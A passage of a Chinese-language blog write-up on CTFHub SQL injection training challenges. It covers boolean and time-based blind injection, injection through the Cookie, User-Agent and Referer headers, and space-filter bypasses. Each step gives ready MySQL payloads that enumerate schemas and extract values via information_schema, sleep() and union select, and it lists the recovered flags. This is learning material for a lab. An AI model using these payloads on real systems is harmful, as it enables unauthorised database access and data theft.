+<p>2、此时我们有表的数量，但无库名，后面也比较难进展下去。故使用<code class="language-plaintext highlighter-rouge">ord()</code>与<code class="language-plaintext highlighter-rouge">substring()</code>函数配合查库名，构造语句为</p>
+
+<pre><code class="language-mysql">1 and (select ord(substring(database(),$num,1))) = $ascii_num
+</code></pre>
+
+<p>其中<code class="language-plaintext highlighter-rouge">$num</code>配合<code class="language-plaintext highlighter-rouge">substring()</code>函数为你需要查询的字符段，<code class="language-plaintext highlighter-rouge">$ascii_num</code>为待查字符的ASCII码，这一过程比较痛苦。因为不知道库名长度及格式情况下要查的挺多，当然此处也可以二分法查找，利用<code class="language-plaintext highlighter-rouge">&gt;</code>或<code class="language-plaintext highlighter-rouge">&lt;</code>号锁定范围，根据返回error与success判断区间。</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/22/20210722190738.png" alt="image-20210722190738553" /></p>
+
+<p>于是，为了减少自己的工程量，此处自己根据原理就编写了一份脚本解决（后续相关查找皆配合自写相关脚本得以解决）。</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/22/20210722201130.png" alt="image-20210722201130258" /></p>
+
+<p>3、根据上述表的数量得知为2，于是我们再来猜表名长度，构造相关语句：</p>
+
+<pre><code class="language-mysql">1 and (select length(table_name) from information_schema.tables where table_schema=database() limit $table_num,1)=$num
+</code></pre>
+
+<p>其中<code class="language-plaintext highlighter-rouge">$table_num</code>值从0开始，<code class="language-plaintext highlighter-rouge">$num</code>为阿拉伯数字，表示表的长度。</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/22/20210722191603.png" alt="image-20210722191603558" /></p>
+
+<p>上图得知第一个表名长度为4，经手工测试发现另一个表名长度也为4。</p>
+
+<p>4、接下来根据表名的长度值确定表名，构造语句为：</p>
+
+<pre><code class="language-mysql">1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit $num1,1),$num2,1))=$ascii_num
+</code></pre>
+
+<p>其中，<code class="language-plaintext highlighter-rouge">$num1</code>为第一个表名值，从0开始，0表示第一个表，<code class="language-plaintext highlighter-rouge">$num2</code>为待查询表名字符，由1开始递增，1表示查询表名第一个字符，<code class="language-plaintext highlighter-rouge">$ascii_num</code>为ASCII码。</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/22/20210722191917.png" alt="image-20210722191917150" /></p>
+
+<p>上图查找后第一个表名为news，第二个表名为flag，此处查找借助脚本完成。</p>
+
+<p>5、根据上述表名，在查询表中的字段数，构造语句：</p>
+
+<pre><code class="language-mysql">1 and (select count(column_name) from information_schema.columns where table_name='$table_name')=$num
+</code></pre>
+
+<p>其中<code class="language-plaintext highlighter-rouge">$table_name</code>为上述查找到的表名，<code class="language-plaintext highlighter-rouge">$num</code>为字段数，即枚举表中有多少字段，此处耗时不长，就两个表需要确认字段。</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/22/20210722192749.png" alt="image-20210722192749247" /></p>
+
+<p>由上图得知news表有两个字段，而另一张flag表查找后发现就1个字段.</p>
+
+<p>6、根据上述得到的相关字段数确定每一列长度，构造语句为：</p>
+
+<pre><code class="language-mysql">1 and length(substr((select column_name from information_schema.columns where table_name='$table_name' limit $​​num1,1),1))=$num2
+</code></pre>
+
+<p>其中<code class="language-plaintext highlighter-rouge">$table_name</code>为待确定的表，<code class="language-plaintext highlighter-rouge">$num1</code>为待确定的第几列字段，从0开始，<code class="language-plaintext highlighter-rouge">$num2</code>为待确定的该列字段的长度值。</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/22/20210722193314.png" alt="image-20210722193314569" /></p>
+
+<p>由上图得知flag表第一个字段长度为4，另一张news表经测试发现第一个字段长度为2，第二个字段长度为4。</p>
+
+<p>7、根据字段长度确定字段名，构造语句为：</p>
+
+<pre><code class="language-mysql">1 and ascii(substr((select column_name from information_schema.columns where table_name='$table_name' limit $num1,1),$num2,1))=$ascii_num
+</code></pre>
+
+<p>其中<code class="language-plaintext highlighter-rouge">$table_name</code>为待确定字段值的表名，<code class="language-plaintext highlighter-rouge">$num1</code>为待确定的第几列字段，从0开始，0表示第一个字段，<code class="language-plaintext highlighter-rouge">$num2</code>表示该列字段的第几个数值，从1递增，1表示第一个，此处排查很耗费时间，可以借助二分法查找。</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/22/20210722193930.png" alt="image-20210722193930032" /></p>
+
+<p>由上图得知flag表的第一个字段的第一个值ASCII码值为102，即f，查完后该字段值为flag；另一个表名news的第一个字段名为id，第二个字段名为data。此处为查找方便故使用脚本解决：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/22/20210722201317.png" alt="image-20210722201317275" /></p>
+
+<p>8、根据数据库名、表名、字段名确定字段的值，构造语句为：</p>
+
+<pre><code class="language-mysql">1 and ascii(substr((select $column_name from $table_name limit $num1,1),$num2,1))=$ascii_num
+</code></pre>
+
+<p>其中，<code class="language-plaintext highlighter-rouge">$column_name</code>为字段名，<code class="language-plaintext highlighter-rouge">$table_name</code>为表名，也可以是<code class="language-plaintext highlighter-rouge">库名.表名</code>的形式，<code class="language-plaintext highlighter-rouge">$num1</code>为第几行的值，从0开始，0表示该字段中的第一行值；<code class="language-plaintext highlighter-rouge">$num2</code>表示该行字段的第几个值，从1递增，1表示该字段的第一个值，<code class="language-plaintext highlighter-rouge">$ascii_num</code>表示ASCII码。</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/22/20210722195820.png" alt="image-20210722195820424" /></p>
+
+<p>上图可知，news表中id字段第一行第一个值的ASCII码值为49，即1。由于此处news表不是我们的目标数据表，遂直接跑flag表，直接上脚本跑得flag表，结果如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/22/20210722201540.png" alt="image-20210722201540813" /></p>
+
+<p>可知flag字段值为<code class="language-plaintext highlighter-rouge">ctfhub{1f7aaf763a54c3ec1a39a01f}</code>。</p>
+
+<h2 id="sql-时间盲注">SQL 时间盲注</h2>
+
+<h3 id="相关知识-4">相关知识</h3>
+
+<p>时间盲注指通过页面执行的时间来判断数据内容的注入方式，通常用于数据（包含逻辑型）不能返回到页面中的场景，无法利用页面回显判断数据内容，只能通过执行的时间来获取数据</p>
+
+<p>时间盲注一般步骤如下：</p>
+
+<ul>
+  <li>构造一个payload，payload内的延迟函数设置参数为<code class="language-plaintext highlighter-rouge">t</code>，如果满足某种条件，则延时 <code class="language-plaintext highlighter-rouge">t</code> 秒之后返回；否则直接返回。</li>
+  <li>发送payload，观察执行时间，从而推断出条件是否满足。</li>
+  <li>重复上述两步，直到推出所有信息。</li>
+</ul>
+
+<p>使用到的函数功能及介绍如下：</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">sleep(t)</code>：延时<code class="language-plaintext highlighter-rouge">t</code>秒钟。这个函数返回值是0。</li>
+  <li><code class="language-plaintext highlighter-rouge">length(str)</code> ：返回<code class="language-plaintext highlighter-rouge">str</code>的长度。</li>
+  <li><code class="language-plaintext highlighter-rouge">substring()</code>或<code class="language-plaintext highlighter-rouge">substr()</code>：可以截取字符串，可指定开始的位置和截取的长度，结合<code class="language-plaintext highlighter-rouge">ascii()</code>使用。</li>
+  <li><code class="language-plaintext highlighter-rouge">mid()</code>：同<code class="language-plaintext highlighter-rouge">substring()</code>。</li>
+  <li><code class="language-plaintext highlighter-rouge">left(str,len)</code> ：字符串左截取函数，返回<code class="language-plaintext highlighter-rouge">str</code>的左<code class="language-plaintext highlighter-rouge">len</code>个字符。</li>
+  <li><code class="language-plaintext highlighter-rouge">right(str,len)</code> ：字符串右截取函数，返回<code class="language-plaintext highlighter-rouge">sre</code>的右<code class="language-plaintext highlighter-rouge">len</code>个字符。</li>
+  <li><code class="language-plaintext highlighter-rouge">ord()</code>：可以返回单个字符的ASCII码，反之<code class="language-plaintext highlighter-rouge">char()</code>函数可将ASCII码转换为对应的字符。</li>
+  <li><code class="language-plaintext highlighter-rouge">ascii(str)</code>：获取<code class="language-plaintext highlighter-rouge">str</code>字符的ASCII码，如果<code class="language-plaintext highlighter-rouge">str</code>是空串，则返回0；如果<code class="language-plaintext highlighter-rouge">str</code>是<code class="language-plaintext highlighter-rouge">NULL</code>，则返回<code class="language-plaintext highlighter-rouge">NULL</code>。</li>
+  <li><code class="language-plaintext highlighter-rouge">if(expr1, expr2, expr3)</code> ：逻辑判断函数。如果<code class="language-plaintext highlighter-rouge">expr1</code>为真，则执行<code class="language-plaintext highlighter-rouge">expr2</code>，否则执行<code class="language-plaintext highlighter-rouge">expr3</code>。</li>
+</ul>
+
+<h3 id="ctfhub时间盲注">CTFHub(时间盲注)</h3>
+
+<blockquote>
+  <p>此处因时间关系未编写相对完善的脚本了，基于ctfhub技能树的flag字段值皆是在sqli.flag表中，故此处只说明注入流程及实现。</p>
+
+  <p>注：SQL语句构造千千万，下方只是个人实践并根据执行逻辑总结出来的语句。</p>
+</blockquote>
+
+<p>1、根据上述的相关知识，开始尝试注入，先编写语句为：</p>
+
+<pre><code class="language-mysql">1 and if(1=1,sleep(3),0) --+
+</code></pre>
+
+<p>浏览器窗口明显的延迟，故语句注入成功，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723120123.png" alt="image-20210723120116025" /></p>
+
+<p>后又根据单引号<code class="language-plaintext highlighter-rouge">'</code>与右括号的闭合尝试执行<code class="language-plaintext highlighter-rouge">)</code>，发现均没有执行到if里面的<code class="language-plaintext highlighter-rouge">sleep()</code>函数，故可以猜测SQL语句是整型注入的语句。</p>
+
+<p>2、猜一下数据库名的长度值，构造语句为：</p>
+
+<pre><code class="language-mysql">1 and if((select count(schema_name) from information_schema.schemata)=$num,sleep(3),1)
+</code></pre>
+
+<p>其中<code class="language-plaintext highlighter-rouge">$num</code>为数据库名的长度值，当值为4的时候，延迟函数执行了，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723122851.png" alt="image-20210723122851015" /></p>
+
+<p>由此可知数据库名长度为4。</p>
+
+<p>3、知道数据库名长度为4后，开始枚举一下当前的数据库名，构造语句为：</p>
+
+<pre><code class="language-mysql">1 and if(ascii(substring(database(),$num,1))=$ascii_num,sleep(3),1) --+
+</code></pre>
+
+<p>其中<code class="language-plaintext highlighter-rouge">$num</code>为该库的第几个字符值，从1开始递增，<code class="language-plaintext highlighter-rouge">$ascii_num</code>为对应的ASCII码，此处也可以使用二分法查找，执行后观察控制台，延迟了3秒，故语句执行成功，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723123345.png" alt="image-20210723123345302" /></p>
+
+<p>上述图可知，ASCII码为115，即数据库名第一个值为s时执行了延迟函数，后面同理推断出数据库名为sqli。</p>
+
+<p>4、根据库名开始枚举表的数量，构造语句为：</p>
+
+<pre><code class="language-mysql">1 and if((select count(table_name) from information_schema.tables where table_schema=database())=$num,sleep(3),1) --+
+</code></pre>
+
+<p>其中<code class="language-plaintext highlighter-rouge">$num</code>为表的数量值，但该值为2的时候，延迟函数成功执行，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723124130.png" alt="image-20210723124130854" /></p>
+
+<p>上述图说明库中有2张表，开始下一步。</p>
+
+<p>5、根据表的数量开始查表名的长度值，构造语句为：</p>
+
+<pre><code class="language-mysql">1 and if((select length(table_name) from information_schema.tables where table_schema=database() limit $table_num,1)=$num,sleep(3),1) --+
+</code></pre>
+
+<p>其中<code class="language-plaintext highlighter-rouge">$table_num</code>为表的数量值，从0开始，0表示第一张表，<code class="language-plaintext highlighter-rouge">$num</code>表示长度值，当<code class="language-plaintext highlighter-rouge">$table_num</code>为0<code class="language-plaintext highlighter-rouge">$num</code>为4的时候，延迟函数执行，此时可知第一张表的长度为4，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723124921.png" alt="image-20210723124921736" /></p>
+
+<p>查询另一张表得知另一张表的长度值也为4。</p>
+
+<p>6、根据表的长度值及数量值开始枚举表的字符值，构造语句为：</p>
+
+<pre><code class="language-mysql">1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit $table_num,1),$num,1))=ascii_num,sleep(3),1)
+</code></pre>
+
+<p>其中<code class="language-plaintext highlighter-rouge">$table_num</code>为待查询的表的列值，0开始递增，0表示第一列的表，<code class="language-plaintext highlighter-rouge">$num</code>表示该列表名的第几个字符，1开始递增，1表示第一个，<code class="language-plaintext highlighter-rouge">$ascii_num</code>表示ASCII码值。</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723125813.png" alt="image-20210723125813557" /></p>
+
+<p>由上图可知第2张表的第一个字符值ascii码为102时延迟语句执行成功，该ASCII码对应字符为f，继续推断后续的字符值后得知该表名称为flag，另一张表名为news。</p>
+
+<p>7、根据表名开始枚举表中的字段数，构造语句为：</p>
+
+<pre><code class="language-mysql">1 and if((select count(column_name) from information_schema.columns where table_name='$table_name')=$num,sleep(3),1)
+</code></pre>
+
+<p>其中<code class="language-plaintext highlighter-rouge">$table_name</code>为待查询的表名，<code class="language-plaintext highlighter-rouge">$num</code>为待查询的表名中的字段数。结果如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723130520.png" alt="image-20210723130520023" /></p>
+
+<p>由上图可知flag表中的字段数为1的时候，延迟函数执行，故flag表中只有一个字段；查询另一张news表中有两个字段数。</p>
+
+<p>8、根据字段数、表名开始枚举字段长度，构造语句为：</p>
+
+<pre><code class="language-mysql">1 and if((select length(column_name) from information_schema.columns where table_name='$table_name' limit $num1,1)=$num2,sleep(3),1)
+</code></pre>
+
+<p>其中<code class="language-plaintext highlighter-rouge">$table_name</code>为待查询相关字段数的表名，<code class="language-plaintext highlighter-rouge">$num1</code>为待查询的第几个字段，从0开始递增，0表示第一个字段，<code class="language-plaintext highlighter-rouge">$num2</code>表示字段的长度值，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723132653.png" alt="image-20210723132653229" /></p>
+
+<p>由图可知，flag表中第一个字段的长度值为4；news表中第一个字段长度值为2，第二个字段长度值为4。</p>
+
+<p>9、根据字段长度枚举字段值，构造语句为：</p>
+
+<pre><code class="language-mysql">1 and if(ascii(substr((select column_name from information_schema.columns where table_name='$table_name' limit $num1,1),$num2,1))=$ascii_num,sleep(3),1)
+</code></pre>
+
+<p>其中<code class="language-plaintext highlighter-rouge">$table_name</code>表示待查询的表名，<code class="language-plaintext highlighter-rouge">$num1</code>表示待查询的字段，0开始递增，0表示第一个字段，<code class="language-plaintext highlighter-rouge">$num2</code>表示该字段的第几个字符，1开始递增查询，1表示第一个字符，<code class="language-plaintext highlighter-rouge">$ascii_num</code>表示对应ASCII码，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723133309.png" alt="image-20210723133309601" /></p>
+
+<p>上图可知flag表中第一个字段的第一个字符的ASCII码值为102，即f，延迟函数执行成功。并同理算出完整的字段为flag；news表第一个字段为id，第二个字段为data。</p>
+
+<p>10、根据上述的库名、表名、字段名，就可以开始算字段对应的值了，构造语句为：</p>
+
+<pre><code class="language-mysql">1 and if(ascii(substr((select $column_name from $table_name limit $num1,1),$num2,1))=$ascii_num,sleep(3),1)
+</code></pre>
+
+<p>其中，<code class="language-plaintext highlighter-rouge">$column_name</code>为字段名，<code class="language-plaintext highlighter-rouge">$table_name</code>为表名，也可以是<code class="language-plaintext highlighter-rouge">库名.表名</code>的形式，<code class="language-plaintext highlighter-rouge">$num1</code>为第几行的值，从0开始，0表示该字段中的第一行值，<code class="language-plaintext highlighter-rouge">$num2</code>表示该行字段的第几个值，从1递增，1表示该字段的第一个值，<code class="language-plaintext highlighter-rouge">$ascii_num</code>表示ASCII码。</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723134034.png" alt="image-20210723134034318" /></p>
+
+<p>由上图可知，flag表中的flag字段第一行的第一个字符值的ASCII码值为99，即c，于是根据后面的测试，得到字段值为<code class="language-plaintext highlighter-rouge">ctfhub{514f8991817a193a354e1939}</code>，提交，成功通过。</p>
+
+<h2 id="sql-cookie注入">SQL Cookie注入</h2>
+
+<p>此处的注入点为Cookie字段了，原理是后台在接收Cookie字段时没有对Cookie做过滤。正常情况下，我们在进行渗透测试的时候，Cookie字段也可用作一个注入点。</p>
+
+<h3 id="ctfhubcookie注入">CTFHub(Cookie注入)</h3>
+
+<p>1、这次打开链接发现输入的参数在cookie中了，遂借助EditThisCookie工具修改cookie值提交请求。</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723151526.png" alt="image-20210723151526642" /></p>
+
+<p>2、使用<code class="language-plaintext highlighter-rouge">order by</code>与<code class="language-plaintext highlighter-rouge">union</code>确定字段值与回显字段后，构造语句：</p>
+
+<pre><code class="language-mysql">-1 union select 1,database()
+</code></pre>
+
+<p>得到当前数据库名，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723151901.png" alt="image-20210723151901323" /></p>
+
+<p>3、根据库名枚举表名，构造语句为：</p>
+
+<pre><code class="language-mysql">-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'
+</code></pre>
+
+<p>成功得到表，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723152107.png" alt="image-20210723152107252" /></p>
+
+<p>4、根据表名枚举字段名，语句为：</p>
+
+<pre><code class="language-mysql">-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='wtosponpou'
+</code></pre>
+
+<p>成功得到字段名：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723152216.png" alt="image-20210723152216378" /></p>
+
+<p>5、根据字段名枚举字段值，相关语句为：</p>
+
+<pre><code class="language-mysql">-1 union select 1,group_concat(gmbwiemzxe) from sqli.wtosponpou
+</code></pre>
+
+<p>成功得到flag：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723152351.png" alt="image-20210723152351790" /></p>
+
+<h2 id="sql-ua注入">SQL UA注入</h2>
+
+<p>注入点变成了浏览器的User-Agent，原理是后台在接收UA时没有对UA做过滤。</p>
+
+<p><em>注入利用方法同SQL Cookie注入，此处不在概述。</em></p>
+
+<h2 id="sql-refer注入">SQL Refer注入</h2>
+
+<p>注入点变成了Refer字段，注入原理是后台在接收Refer时没有对Refer做过滤。</p>
+
+<p><em>注入利用方法同SQL Cookie注入，此处不在概述。</em></p>
+
+<h2 id="sql-过滤空格">SQL 过滤空格</h2>
+
+<h3 id="相关知识-5">相关知识</h3>
+
+<p>SQL注入时，空格的使用是非常普遍的。比如，我们使用union来取得目标数据，构造语句时在and两侧、union两侧、select的两侧，都需要空格，而过滤空格，也是防注入的一种手段。</p>
+
+<p>其可以绕过的方式如下：</p>
+
+<p><strong>一、注释绕过空格</strong></p>
+
+<p>这是最基本的方法，在一些自动化SQL注入工具中，使用也十分普遍。在MySQL中，用</p>
+
+<p><code class="language-plaintext highlighter-rouge">/*注释*/</code></p>
+
+<p>来标记注释的内容。比如SQL查询：</p>
+
+<pre><code class="language-mysql">select user() from sqli;
+</code></pre>
+
+<p>我们用注释替换空格，就可以变成：</p>
+
+<pre><code class="language-mysql">select/**/user()/**/from/**/sqli;
+</code></pre>
+
+<p><strong>二、括号绕过空格</strong></p>
+
+<p>空格被过滤，但括号没有被过滤，可通过括号绕过。在MySQL中，括号通常是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
+
+<p>有这样的一条SQL查询：</p>
+
+<pre><code class="language-mysql">select user() from sqli where 1=1 and 2=2;
+</code></pre>
+
+<p>如何把空格减到最少？</p>
+
+<p>观察到user()可以算值，那么user()两边要加括号，变成：</p>
+
+<pre><code class="language-mysql">select(user())from sqli where 1=1 and 2=2;
+</code></pre>
+
+<p>继续，1=1和2=2可以算值，也加括号，去空格，变成：</p>
+
+<pre><code class="language-mysql">select(user())from sqli where(1=1)and(2=2);
+</code></pre>
+
+<p>sqli两边的空格，通常是由程序员自己添加，我们一般无法控制。所以上面就是空格最少的结果。</p>
+
+<h3 id="ctfhub过滤空格">CTFHub(过滤空格)</h3>
+
+<p>1、过滤空格，顾名思义就是将SQL语句中的空格给注释掉。下面将使用注释符进行绕过。老方法，先使用<code class="language-plaintext highlighter-rouge">order by</code>和<code class="language-plaintext highlighter-rouge">union</code>判断字段数与回显值，构造相关语句：</p>
+
+<pre><code class="language-mysql">-1/**/union/**/select/**/1,database()
+</code></pre>
+
+<p>成功出库名：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723164042.png" alt="image-20210723164042542" /></p>
+
+<p>2、枚举表名，构造语句为：</p>
+
+<pre><code class="language-mysql">-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='sqli'
+</code></pre>
+
+<p>成功得到表，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723164153.png" alt="image-20210723164153610" /></p>
+
+<p>3、根据表名枚举字段名，构造语句：</p>
+
+<pre><code class="language-mysql">-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='ptmgnbdssq'
+</code></pre>
+
+<p>成功得到字段名：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723164358.png" alt="image-20210723164358222" />4、根据字段名枚举字段值，构造语句为：</p>
+
+<pre><code class="language-mysql">-1/**/union/**/select/**/1,group_concat(qfbfzkcbul)/**/from/**/sqli.ptmgnbdssq
+</code></pre>
+
+<p>成功得到flag：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/07/23/20210723164516.png" alt="image-20210723164516719" /></p>
+
+                <!-- [x] 2022/10/20/10:49:36 fixed: while width < some inch. would be flex column not display like a row.-->
+<footer>
+	<style>.border-top {
+		border-top: 1.5px solid #d0d7de!important;
+	}</style>
+	<div class="border-top"></div>
+		<section class="container-xl mt-lg-8 mt-6 px-3 px-md-6 no-print mx-auto">
+			<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix ">
+				<h2 class="lead">申明</h2>
+				<div>
+					<div class="mb-2"><a href="/blog/2022/SQL注入学习记录/" target="_blank" class=" text-bold">
+						<div class="fa fa-link"></div>
+						转载请申明本文档链接</a></div>
+					<div><a href="https://github.com/Yang2635" target="_blank"  class="text-bold">
+						<div class="fa fa-user"></div>
+						Post by Yang2635.</a>
+					</div>
+				</div>
+			</div>
+			<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix">
+				<h2 class="lead">贡献开源文档</h2>
+				<div>
+					<a href="https://github.com/Bin4xin/bin4xin.github.io/tree/main/_posts/blog/2022-01-17-SQL注入学习记录.md" target="_blank" class="no-underline btn mr-1 color-border-accent-emphasis">
+						<svg aria-hidden="true" focusable="false" role="img" class="octicon mr-1" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;"><path fill-rule="evenodd" d="M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z"></path></svg>
+						贡献当前开源文档
+					</a>
+					<p class="f0_8-l mt-2 text-bold">此之前，学习开源贡献<a target="_blank" href="https://github.com/Bin4xin/bin4xin.github.io/wiki/Git操作-Git如何贡献仓库代码">CN&nbsp;|</a>
+						<a target="_blank" href="https://github.com/github/docs/blob/main/CONTRIBUTING.md">EN</a></p>
+				</div>
+			</div>
+			<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix">
+				<h2 class="lead">此文档对您有帮助吗</h2>
+				<a href="https://github.com/Bin4xin/bin4xin.github.io/" target="_blank" class="no-underline">
+				<span class="btn mr-1 color-border-accent-emphasis" title="给文档仓库点个赞!">
+					<div class="fa fa-thumbs-o-up"></div>
+				</span>
+				</a>
+				<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&template=2-bug_report.yaml&title=_posts/blog/2022-01-17-SQL注入学习记录.md&nbsp; SQL注入学习记录 | © 哨兵 | SENTINEL SECURITY, LAB" target="_blank">
+				<span class="btn mr-1 color-border-accent-emphasis" title="本文档有问题?">
+				<div class="fa fa-thumbs-o-down"></div>
+				</span>
+				</a>
+			</div>
+		</section>
+</footer>
+            </div>
+            <div class="spacing"></div>
+        </div><!--/col-lg-8 -->
+        
+<div class="col-md-4 ml-hide table-of-contents__left-border" style="max-height: 100%">
+    <div class="nav nav-stacked tableOfContents_35-E thin-scrollbar position-sticky top-0">
+        <li class=" table-of-contents">
+            <code-index-css>
+                <ul><li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column"><a>文章目录</a></li></ul>
+                <ul id="toc" class="section-nav">
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#sql-整型注入">SQL 整型注入</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#相关知识">相关知识</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#相关练习">相关练习</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#ctfhub整数型注入">CTFHub(整数型注入)</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#sqliseries-2">SQLI(SERIES-2)</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#sql-字符型注入">SQL 字符型注入</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#相关知识-1">相关知识</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#相关练习-1">相关练习</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#sqliseries-1">SQLI(SERIES-1)</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#sql-报错注入">SQL 报错注入</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#相关知识-2">相关知识</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#主键重复报错">主键重复报错</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#xpath语法错误报错">xpath语法错误报错</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#ctfhub报错注入">CTFHub(报错注入)</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#sql-布尔注入">SQL 布尔注入</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#相关知识-3">相关知识</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#ctfhub布尔注入">CTFHub(布尔注入)</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#sql-时间盲注">SQL 时间盲注</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#相关知识-4">相关知识</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#ctfhub时间盲注">CTFHub(时间盲注)</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#sql-cookie注入">SQL Cookie注入</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#ctfhubcookie注入">CTFHub(Cookie注入)</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#sql-ua注入">SQL UA注入</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#sql-refer注入">SQL Refer注入</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#sql-过滤空格">SQL 过滤空格</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#相关知识-5">相关知识</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#ctfhub过滤空格">CTFHub(过滤空格)</a></li>
+</ul>
+</li>
+</ul>
+            </code-index-css>
+        </li>
+    </div>
+</div>
+
+    </div><!--/row -->
+</div><!--/container -->
